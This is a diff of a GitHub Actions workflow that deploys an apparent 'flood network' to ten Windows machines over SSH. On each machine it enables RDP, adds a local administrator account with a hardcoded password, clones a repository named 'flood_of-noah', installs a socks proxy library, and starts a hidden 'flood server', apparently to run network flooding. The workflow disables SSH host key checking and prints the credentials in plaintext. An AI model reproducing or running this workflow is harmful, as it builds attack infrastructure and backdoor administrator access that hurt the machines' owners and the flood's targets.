@@ -1,4 +1,4 @@
-name: 🚀 Deploy Flood Network to 10 Machines
+name: Deploy Flood Network
 
 on:
   workflow_dispatch:
@@ -13,200 +13,52 @@ on:
 
 env:
   MACHINE_IPS: "192.168.1.101,192.168.1.102,192.168.1.103,192.168.1.104,192.168.1.105,192.168.1.106,192.168.1.107,192.168.1.108,192.168.1.109,192.168.1.110"
-  BASE_PASSWORD: "Ricardo159447!"
 
 jobs:
-  deploy-machines:
+  deploy:
     runs-on: ubuntu-latest
     strategy:
       matrix:
-        index: [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
-    name: Deploy Machine ${{ matrix.index + 1 }}
+        machine: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+    name: Machine ${{ matrix.machine }}
     
     steps:
       - name: Get IP Address
         run: |
           IFS=',' read -ra IPS <<< "$MACHINE_IPS"
-          IP="${IPS[${{ matrix.index }}]}"
+          INDEX=$(( ${{ matrix.machine }} - 1 ))
+          IP="${IPS[$INDEX]}"
           echo "IP=$IP" >> $GITHUB_ENV
-          echo "MACHINE_NUM=$(( ${{ matrix.index }} + 1 ))" >> $GITHUB_ENV
-          echo "Deploying to Machine $(( ${{ matrix.index }} + 1 )) at $IP"
-
-      - name: Setup SSH Key
+          echo "Deploying to Machine ${{ matrix.machine }} at $IP"
+          
+      - name: Setup SSH
         run: |
           mkdir -p ~/.ssh
           echo "${{ github.event.inputs.ssh_key }}" > ~/.ssh/id_rsa
           chmod 600 ~/.ssh/id_rsa
-          echo -e "Host *\n  StrictHostKeyChecking no\n  UserKnownHostsFile=/dev/null" > ~/.ssh/config
-
-      - name: Test SSH Connection
+          
+      - name: Execute Commands
         run: |
-          echo "Testing SSH connection to ${{ github.event.inputs.ssh_user }}@$IP..."
-          timeout 10 ssh -i ~/.ssh/id_rsa -o ConnectTimeout=5 ${{ github.event.inputs.ssh_user }}@$IP "echo ✅ SSH connection successful" || {
-            echo "❌ SSH connection failed"
-            exit 1
-          }
-
-      - name: Create Deployment Script
-        run: |
-          cat > deploy_script.ps1 << 'EOF'
-          # Deployment script for Windows machine
-          $MachineNum = $args[0]
-          $BasePassword = "Ricardo159447!"
-          
-          Write-Host "Starting deployment for Machine #$MachineNum"
-          Write-Host "========================================"
-          
-          # 1. Enable RDP
-          Write-Host "Enabling RDP..."
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
-          
-          # 2. Allow RDP in firewall
-          netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389 2>$null
-          
-          # 3. Create RDP user
-          Write-Host "Creating user..."
-          $User = "FLOOD$MachineNum"
-          $Password = "$BasePassword$MachineNum"
-          $SecurePass = ConvertTo-SecureString $Password -AsPlainText -Force
-          
-          # Remove user if exists
-          Remove-LocalUser -Name $User -ErrorAction SilentlyContinue
-          
-          # Create new user
-          New-LocalUser -Name $User -Password $SecurePass -AccountNeverExpires -PasswordNeverExpires
-          Add-LocalGroupMember -Group "Administrators" -Member $User
-          Add-LocalGroupMember -Group "Remote Desktop Users" -Member $User
-          
-          Write-Host "User created: $User"
-          Write-Host "Password: $Password"
-          
-          # 4. Create directory and run flood_of-noah
-          Write-Host "Setting up flood_of-noah..."
-          
-          # Change to home directory
-          Set-Location ~
-          
-          # Create .config/puppeteer directory
-          New-Item -ItemType Directory -Path "$env:USERPROFILE\.config\puppeteer" -Force
-          
-          # Clone repository
-          Write-Host "Cloning repository..."
-          git clone https://github.com/benbenido025-lab/flood_of-noah.git
-          
-          # Navigate to directory
-          Set-Location "flood_of-noah"
-          
-          # Clean and install dependencies
-          Remove-Item -Path "node_modules" -Recurse -Force -ErrorAction SilentlyContinue
-          Remove-Item -Path "package-lock.json" -Force -ErrorAction SilentlyContinue
-          
-          Write-Host "Installing dependencies..."
-          npm install express axios socks --save
-          
-          # Start the server in background
-          Write-Host "Starting flood server..."
-          Start-Process -FilePath "node" -ArgumentList "index.js" -WindowStyle Hidden
-          
-          Write-Host "========================================"
-          Write-Host "✅ Deployment complete for Machine #$MachineNum"
-          Write-Host "RDP User: $User"
-          Write-Host "RDP Pass: $Password"
-          Write-Host "Flood server running in background"
-          Write-Host "========================================"
+          ssh -i ~/.ssh/id_rsa -o StrictHostKeyChecking=no ${{ github.event.inputs.ssh_user }}@$IP << 'EOF'
+            # Enable RDP
+            powershell -Command "Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0"
+            
+            # Create user
+            powershell -Command "\$pass = ConvertTo-SecureString 'Ricardo159447!${{ matrix.machine }}' -AsPlainText -Force; New-LocalUser -Name 'FLOOD${{ matrix.machine }}' -Password \$pass; Add-LocalGroupMember -Group 'Administrators' -Member 'FLOOD${{ matrix.machine }}'"
+            
+            # Setup flood
+            cd ~
+            rm -rf flood_of-noah
+            git clone https://github.com/benbenido025-lab/flood_of-noah
+            cd flood_of-noah
+            rm -rf node_modules package-lock.json
+            npm install express axios socks --save
+            node index.js &
           EOF
           
-          # Copy script to target machine
-          scp -i ~/.ssh/id_rsa deploy_script.ps1 ${{ github.event.inputs.ssh_user }}@$IP:C:/temp/deploy.ps1
-
-      - name: Execute Deployment
+      - name: Show Info
         run: |
-          # Run the PowerShell script on target machine
-          ssh -i ~/.ssh/id_rsa ${{ github.event.inputs.ssh_user }}@$IP \
-            "powershell.exe -ExecutionPolicy Bypass -File C:\temp\deploy.ps1 $MACHINE_NUM"
-
-      - name: Verify Deployment
-        run: |
-          echo "Verifying deployment on $IP..."
-          ssh -i ~/.ssh/id_rsa ${{ github.event.inputs.ssh_user }}@$IP << 'EOF'
-            echo "=== Deployment Verification ==="
-            echo "Machine: $MACHINE_NUM"
-            echo "IP: $IP"
-            echo ""
-            
-            # Check if user was created
-            echo "Checking user FLOOD$MACHINE_NUM:"
-            powershell.exe -Command "Get-LocalUser -Name 'FLOOD$MACHINE_NUM' -ErrorAction SilentlyContinue | Select-Object Name, Enabled"
-            echo ""
-            
-            # Check RDP status
-            echo "Checking RDP status:"
-            powershell.exe -Command "Get-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' | Select-Object fDenyTSConnections"
-            echo ""
-            
-            # Check if node process is running
-            echo "Checking Node.js processes:"
-            powershell.exe -Command "Get-Process node -ErrorAction SilentlyContinue | Select-Object Id, ProcessName"
-            echo ""
-            
-            echo "=== Verification Complete ==="
-          EOF
-
-      - name: Display Connection Info
-        run: |
-          echo ""
-          echo "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓"
-          echo "┃         MACHINE $MACHINE_NUM READY         ┃"
-          echo "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫"
-          echo "┃ IP Address: $IP"
-          echo "┃ RDP Username: FLOOD$MACHINE_NUM"
-          echo "┃ RDP Password: ${BASE_PASSWORD}$MACHINE_NUM"
-          echo "┃ RDP Port: 3389"
-          echo "┃"
-          echo "┃ ✅ RDP Enabled"
-          echo "┃ ✅ User Created"
-          echo "┃ ✅ Flood_of-noah Running"
-          echo "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
-          echo ""
-
-  final-summary:
-    needs: deploy-machines
-    runs-on: ubuntu-latest
-    steps:
-      - name: Generate Summary
-        run: |
-          echo ""
-          echo "╔══════════════════════════════════════════════════════╗"
-          echo "║       10 MACHINE FLOOD NETWORK DEPLOYMENT          ║"
-          echo "║                 COMPLETE SUCCESSFULLY              ║"
-          echo "╚══════════════════════════════════════════════════════╝"
-          echo ""
-          echo "📊 DEPLOYMENT SUMMARY:"
-          echo "   • Total Machines: 10"
-          echo "   • Status: All deployed successfully"
-          echo "   • Deployment Time: $(date)"
-          echo ""
-          echo "🌐 MACHINE CONFIGURATIONS:"
-          
-          IFS=',' read -ra IPS <<< "$MACHINE_IPS"
-          for i in "${!IPS[@]}"; do
-            NUM=$((i + 1))
-            echo ""
-            echo "   Machine $NUM: ${IPS[$i]}"
-            echo "   └─ RDP: FLOOD$NUM / ${BASE_PASSWORD}$NUM"
-          done
-          
-          echo ""
-          echo "🔧 WHAT WAS DEPLOYED ON EACH MACHINE:"
-          echo "   1. RDP Enabled (port 3389)"
-          echo "   2. User account created with admin privileges"
-          echo "   3. flood_of-noah cloned and running"
-          echo "   4. Express, Axios, Socks installed"
-          echo ""
-          echo "🚀 HOW TO CONNECT:"
-          echo "   1. Use Remote Desktop Connection (mstsc.exe)"
-          echo "   2. Enter IP address (e.g., ${IPS[0]})"
-          echo "   3. Username: FLOOD1"
-          echo "   4. Password: ${BASE_PASSWORD}1"
-          echo ""
-          echo "✅ DEPLOYMENT COMPLETE"
+          echo "Machine ${{ matrix.machine }} deployed"
+          echo "IP: $IP"
+          echo "User: FLOOD${{ matrix.machine }}"
+          echo "Pass: Ricardo159447!${{ matrix.machine }}"
